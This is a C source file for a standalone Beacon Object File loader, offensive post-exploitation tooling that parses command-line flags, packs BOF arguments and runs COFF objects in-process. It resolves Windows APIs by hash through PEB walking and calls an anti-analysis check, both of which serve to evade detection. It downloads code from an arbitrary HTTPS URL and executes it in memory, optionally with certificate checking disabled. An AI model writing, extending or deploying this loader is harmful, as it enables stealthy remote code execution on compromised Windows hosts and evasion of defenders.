/*
 * main.c — entry point for the standalone native BOF loader.
 *
 * Parses command line, fetches the BOF from file or HTTPS, packs arguments,
 * runs the in-process COFF loader, and prints captured BOF output.
 */

#include "bofloader.h"

/* -------------------------------------------------------------------------- */
/* Command-line helpers                                                         */
/* -------------------------------------------------------------------------- */

static char* GetCommandLineA(void);
static char* GetCommandLineA(void) {
    PTEB teb = NtCurrentTeb();
    PPEB peb = teb->ProcessEnvironmentBlock;
    /* RTL_USER_PROCESS_PARAMETERS offset 0x68/0x20 on x64 is CommandLine */
    struct _RUP { BYTE pad[0x60]; UNICODE_STRING CommandLine; } *rup = (struct _RUP*)((BYTE*)peb + 0x20);
    (void)rup;
    /* Use PEB offset directly: x64 RTL_USER_PROCESS_PARAMETERS* is at PEB+0x20, CommandLine at RUP+0x60 */
    PVOID rup_ptr = *(PVOID*)((BYTE*)peb + 0x20);
    PUNICODE_STRING cmd = (PUNICODE_STRING)((BYTE*)rup_ptr + 0x60);
    static char buf[2048];
    int i = 0;
    while (i < 2047 && i < cmd->Length / 2) {
        buf[i] = (char)(BYTE)cmd->Buffer[i];
        i++;
    }
    buf[i] = 0;
    return buf;
}

static const char* TrimQuotes(const char* s, int* len) {
    if (*len >= 2 && s[0] == '"' && s[*len - 1] == '"') {
        (*len) -= 2;
        return s + 1;
    }
    return s;
}

/* Very small command-line tokenizer. Splits on spaces, honors double quotes. */
static int Tokenize(LPSTR input, char** tokens, int max_tokens) {
    int n = 0, i = 0, len = StrLenA(input);
    while (i < len && n < max_tokens) {
        while (i < len && (input[i] == ' ' || input[i] == '\t')) i++;
        if (i >= len) break;
        int start = i, in_q = 0;
        while (i < len) {
            if (input[i] == '"') { in_q = !in_q; i++; continue; }
            if (!in_q && (input[i] == ' ' || input[i] == '\t')) break;
            i++;
        }
        tokens[n] = input + start;
        input[i] = '\0';
        n++;
    }
    return n;
}

/* -------------------------------------------------------------------------- */
/* File helpers                                                                 */
/* -------------------------------------------------------------------------- */

static DWORD ReadLocalFile(HEAP_FUNCS* heapf, const char* path, BYTE** out) {
    PVOID k32 = LdrModule(H_KERNEL32_DLL);
    if (!k32) return 0;
    typedef PVOID (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, PVOID, DWORD, DWORD, HANDLE);
    typedef BOOL (WINAPI *pReadFile)(PVOID, PVOID, DWORD, PDWORD, PVOID);
    typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
    typedef DWORD (WINAPI *pGetFileSize)(HANDLE, PDWORD);
    pCreateFileA CreateFileA_ = (pCreateFileA)LdrFunction(k32, H_CREATEFILEA);
    pReadFile ReadFile_ = (pReadFile)LdrFunction(k32, H_READFILE);
    pCloseHandle CloseHandle_ = (pCloseHandle)LdrFunction(k32, H_CLOSEHANDLE);
    pGetFileSize GetFileSize_ = (pGetFileSize)LdrFunction(k32, H_GETFILESIZE);
    if (!CreateFileA_ || !ReadFile_ || !CloseHandle_ || !GetFileSize_) return 0;

    HANDLE h = CreateFileA_(path, 0x80000000, 1, NULL, 3, 0x80, NULL); /* GENERIC_READ, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL */
    if (!h || h == (HANDLE)(LONG_PTR)-1) return 0;
    DWORD size = GetFileSize_(h, NULL);
    if (size == 0 || size == 0xFFFFFFFF) { CloseHandle_(h); return 0; }
    BYTE* buf = (BYTE*)heapf->HeapAlloc(heapf->GetProcessHeap(), 0, size);
    if (!buf) { CloseHandle_(h); return 0; }
    DWORD read = 0;
    if (!ReadFile_(h, buf, size, &read, NULL) || read != size) {
        heapf->HeapFree(heapf->GetProcessHeap(), 0, buf);
        CloseHandle_(h);
        return 0;
    }
    CloseHandle_(h);
    *out = buf;
    return size;
}

/* -------------------------------------------------------------------------- */
/* Argument packer (i= s= z= Z= b=)                                             */
/* -------------------------------------------------------------------------- */

static int HexByte(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static int ParseHex(const char* in, int len, BYTE* out, int max) {
    int n = 0, i = 0;
    while (i < len && n < max) {
        int h = HexByte(in[i]);
        if (h < 0) { i++; continue; }
        if (i + 1 >= len) break;
        int l = HexByte(in[i + 1]);
        if (l < 0) { i++; continue; }
        out[n++] = (BYTE)((h << 4) | l);
        i += 2;
    }
    return n;
}

static void PackGrow(HEAP_FUNCS* heapf, BYTE** buf, DWORD* cap, DWORD* len, DWORD need) {
    if (*len + need <= *cap) return;
    DWORD newcap = *cap ? *cap * 2 : 256;
    while (newcap < *len + need) newcap *= 2;
    BYTE* nb = (BYTE*)heapf->HeapAlloc(heapf->GetProcessHeap(), 0, newcap);
    if (!nb) return;
    MemCpy(nb, *buf, *len);
    heapf->HeapFree(heapf->GetProcessHeap(), 0, *buf);
    *buf = nb;
    *cap = newcap;
}

static void PackAppend(BYTE** buf, DWORD* cap, DWORD* len, const BYTE* data, DWORD n, HEAP_FUNCS* heapf) {
    PackGrow(heapf, buf, cap, len, n);
    if (*len + n > *cap) return;
    MemCpy(*buf + *len, data, n);
    *len += n;
}

static void PackAppendDword(BYTE** buf, DWORD* cap, DWORD* len, DWORD v, HEAP_FUNCS* heapf) {
    BYTE b[4];
    b[0] = (BYTE)v; b[1] = (BYTE)(v >> 8); b[2] = (BYTE)(v >> 16); b[3] = (BYTE)(v >> 24);
    PackAppend(buf, cap, len, b, 4, heapf);
}

static void PackAppendWord(BYTE** buf, DWORD* cap, DWORD* len, WORD v, HEAP_FUNCS* heapf) {
    BYTE b[2];
    b[0] = (BYTE)v; b[1] = (BYTE)(v >> 8);
    PackAppend(buf, cap, len, b, 2, heapf);
}

BYTE* PackBofArgs(HEAP_FUNCS* heapf, const char* input, DWORD* out_len) {
    BYTE* buf = (BYTE*)heapf->HeapAlloc(heapf->GetProcessHeap(), 0, 256);
    DWORD cap = 256, len = 0;
    if (!buf) return NULL;

    /* reserve 4 bytes for total length header */
    len = 4;

    int ilen = input ? StrLenA(input) : 0;
    int i = 0;
    while (i < ilen) {
        while (i < ilen && (input[i] == ' ' || input[i] == '\t')) i++;
        if (i >= ilen) break;
        int start = i;
        while (i < ilen && input[i] != ' ' && input[i] != '\t') i++;
        int toklen = i - start;
        if (toklen < 3) continue;
        const char* tok = input + start;
        char type = tok[0];
        if (tok[1] != '=') continue;
        const char* val = tok + 2;
        int vlen = toklen - 2;
        val = TrimQuotes(val, &vlen);

        if (type == 'i') {
            int v = 0, neg = 0, j = 0;
            if (val[0] == '-') { neg = 1; j++; }
            while (j < vlen && val[j] >= '0' && val[j] <= '9') { v = v * 10 + (val[j] - '0'); j++; }
            if (neg) v = -v;
            PackAppendDword(&buf, &cap, &len, (DWORD)v, heapf);
        } else if (type == 's') {
            int v = 0, neg = 0, j = 0;
            if (val[0] == '-') { neg = 1; j++; }
            while (j < vlen && val[j] >= '0' && val[j] <= '9') { v = v * 10 + (val[j] - '0'); j++; }
            if (neg) v = -v;
            PackAppendWord(&buf, &cap, &len, (WORD)(short)v, heapf);
        } else if (type == 'z') {
            PackAppendDword(&buf, &cap, &len, (DWORD)vlen + 1, heapf);
            PackAppend(&buf, &cap, &len, (const BYTE*)val, vlen, heapf);
            BYTE z = 0; PackAppend(&buf, &cap, &len, &z, 1, heapf);
        } else if (type == 'Z') {
            /* wide string: length includes null wchar */
            PackAppendDword(&buf, &cap, &len, (DWORD)(vlen + 1) * 2, heapf);
            for (int k = 0; k < vlen; k++) {
                WCHAR wc = (WCHAR)(BYTE)val[k];
                PackAppend(&buf, &cap, &len, (const BYTE*)&wc, 2, heapf);
            }
            WCHAR wc = 0; PackAppend(&buf, &cap, &len, (const BYTE*)&wc, 2, heapf);
        } else if (type == 'b') {
            BYTE tmp[512];
            int n = ParseHex(val, vlen, tmp, sizeof(tmp));
            PackAppendDword(&buf, &cap, &len, (DWORD)n, heapf);
            PackAppend(&buf, &cap, &len, tmp, n, heapf);
        }
    }

    /* write total length header */
    buf[0] = (BYTE)(len - 4);
    buf[1] = (BYTE)((len - 4) >> 8);
    buf[2] = (BYTE)((len - 4) >> 16);
    buf[3] = (BYTE)((len - 4) >> 24);

    *out_len = len;
    return buf;
}

/* -------------------------------------------------------------------------- */
/* URL parser                                                                   */
/* -------------------------------------------------------------------------- */

static int ParseUrl(const char* url, WCHAR* host, INTERNET_PORT* port, WCHAR* path, int* use_https) {
    int i = 0;
    *use_https = 0;
    if (StrCmpNI(url, "https://", 8) == 0) { *use_https = 1; i = 8; }
    else return 0;

    int host_start = i;
    while (url[i] && url[i] != ':' && url[i] != '/') i++;
    int host_len = i - host_start;
    if (host_len <= 0 || host_len > 127) return 0;
    for (int j = 0; j < host_len; j++) host[j] = (WCHAR)(BYTE)url[host_start + j];
    host[host_len] = 0;

    *port = *use_https ? 443 : 80;
    if (url[i] == ':') {
        i++;
        int p = 0;
        while (url[i] >= '0' && url[i] <= '9') { p = p * 10 + (url[i] - '0'); i++; }
        *port = (INTERNET_PORT)p;
    }

    int path_i = 0;
    if (url[i] == '/') {
        while (url[i] && path_i < 255) path[path_i++] = (WCHAR)(BYTE)url[i++];
    } else {
        path[path_i++] = L'/';
    }
    path[path_i] = 0;
    return 1;
}

/* -------------------------------------------------------------------------- */
/* Console output                                                               */
/* -------------------------------------------------------------------------- */

static void PrintOut(const char* s, int len) {
    PVOID k32 = LdrModule(H_KERNEL32_DLL);
    if (!k32) return;
    typedef HANDLE (WINAPI *pGetStdHandle)(DWORD);
    typedef BOOL (WINAPI *pWriteFile)(HANDLE, const void*, DWORD, PDWORD, PVOID);
    pGetStdHandle gsh = (pGetStdHandle)LdrFunction(k32, H_GETSTDHANDLE);
    pWriteFile wf = (pWriteFile)LdrFunction(k32, H_WRITEFILE);
    if (!gsh || !wf) return;
    HANDLE h = gsh((DWORD)(LONG_PTR)-11); /* STD_OUTPUT_HANDLE */
    DWORD written = 0;
    wf(h, s, len, &written, NULL);
}

static void PrintOutZ(const char* s) { PrintOut(s, StrLenA(s)); }

/* -------------------------------------------------------------------------- */
/* Entry point                                                                  */
/* -------------------------------------------------------------------------- */

void BofLoaderEntry(void) {
    NT_FUNCS nt;
    HEAP_FUNCS heap;
    HTTP_FUNCS http;

    if (!AntiCheck()) return;
    if (!NtInit(&nt)) return;
    if (!HeapInit(&heap)) return;

    /* parse command line */
    char* cmd = GetCommandLineA();
    char* argv[32];
    int argc = Tokenize(cmd, argv, 32);

    const char* file_path = NULL;
    const char* url = NULL;
    const char* entry = "go";
    const char* args_str = "";
    int ignore_cert = 0;

    for (int a = 1; a < argc; a++) {
        if (StrCmpA(argv[a], "--file") == 0 && a + 1 < argc) file_path = argv[++a];
        else if (StrCmpA(argv[a], "--url") == 0 && a + 1 < argc) url = argv[++a];
        else if (StrCmpA(argv[a], "--entry") == 0 && a + 1 < argc) entry = argv[++a];
        else if (StrCmpA(argv[a], "--args") == 0 && a + 1 < argc) args_str = argv[++a];
        else if (StrCmpA(argv[a], "--ignore-cert") == 0) ignore_cert = 1;
        else if (StrCmpA(argv[a], "--help") == 0 || StrCmpA(argv[a], "-h") == 0) {
            PrintOutZ("Usage: bofloader.exe --file <bof.o> | --url <https://host/path> [options]\n"
                      "Options:\n"
                      "  --entry <name>     Entry point symbol (default: go)\n"
                      "  --args  <string>   Argument tokens: i= s= z= Z= b=\n"
                      "  --ignore-cert       Ignore TLS certificate errors (lab only)\n");
            return;
        }
    }

    if (!file_path && !url) {
        PrintOutZ("[!] specify --file or --url\n");
        return;
    }

    /* load BOF bytes */
    BYTE* bof = NULL;
    DWORD bof_size = 0;
    if (file_path) {
        bof_size = ReadLocalFile(&heap, file_path, &bof);
        if (!bof_size) { PrintOutZ("[!] failed to read local BOF\n"); return; }
    } else {
        PVOID winhttp = LoadDll(L"winhttp.dll");
        if (!winhttp) { PrintOutZ("[!] failed to load winhttp.dll\n"); return; }
        http.WinHttpOpen = (pWinHttpOpen)LdrFunction(winhttp, H_WINHTTPOPEN);
        http.WinHttpConnect = (pWinHttpConnect)LdrFunction(winhttp, H_WINHTTPCONNECT);
        http.WinHttpOpenRequest = (pWinHttpOpenRequest)LdrFunction(winhttp, H_WINHTTPOPENREQUEST);
        http.WinHttpSendRequest = (pWinHttpSendRequest)LdrFunction(winhttp, H_WINHTTPSENDREQUEST);
        http.WinHttpReceiveResponse = (pWinHttpReceiveResponse)LdrFunction(winhttp, H_WINHTTPRECEIVERESPONSE);
        http.WinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)LdrFunction(winhttp, H_WINHTTPQUERYDATAAVAILABLE);
        http.WinHttpReadData = (pWinHttpReadData)LdrFunction(winhttp, H_WINHTTPREADDATA);
        http.WinHttpCloseHandle = (pWinHttpCloseHandle)LdrFunction(winhttp, H_WINHTTPCLOSEHANDLE);
        http.WinHttpSetOption = (pWinHttpSetOption)LdrFunction(winhttp, H_WINHTTPSETOPTION);
        http.WinHttpSetTimeouts = (pWinHttpSetTimeouts)LdrFunction(winhttp, H_WINHTTPSETTIMEOUTS);
        if (!http.WinHttpOpen || !http.WinHttpConnect || !http.WinHttpOpenRequest ||
            !http.WinHttpSendRequest || !http.WinHttpReceiveResponse ||
            !http.WinHttpQueryDataAvailable || !http.WinHttpReadData || !http.WinHttpCloseHandle) {
            PrintOutZ("[!] failed to resolve winhttp APIs\n");
            return;
        }
        WCHAR host[128], path[256];
        INTERNET_PORT port;
        int use_https;
        if (!ParseUrl(url, host, &port, path, &use_https)) {
            PrintOutZ("[!] invalid URL\n");
            return;
        }
        bof = HttpFetch(host, port, path, use_https, ignore_cert, &bof_size, &http, &heap);
        if (!bof || !bof_size) { PrintOutZ("[!] failed to fetch BOF\n"); return; }
    }

    /* pack args */
    DWORD args_len = 0;
    BYTE* args = PackBofArgs(&heap, args_str, &args_len);

    /* run BOF */
    BOF_INSTANCE bi;
    MemSet(&bi, 0, sizeof(bi));
    bi.Nt = &nt;
    bi.Heap = &heap;

    char* output = NULL;
    int output_len = 0;
    int ok = BofRun(&bi, bof, bof_size, entry, args, args_len, &output, &output_len);

    if (output && output_len > 0) PrintOut(output, output_len);
    if (!ok) PrintOutZ("\n[!] BOF execution failed\n");

    /* cleanup */
    BofFree(&bi);
    if (args) heap.HeapFree(heap.GetProcessHeap(), 0, args);
    if (bof) heap.HeapFree(heap.GetProcessHeap(), 0, bof);
}
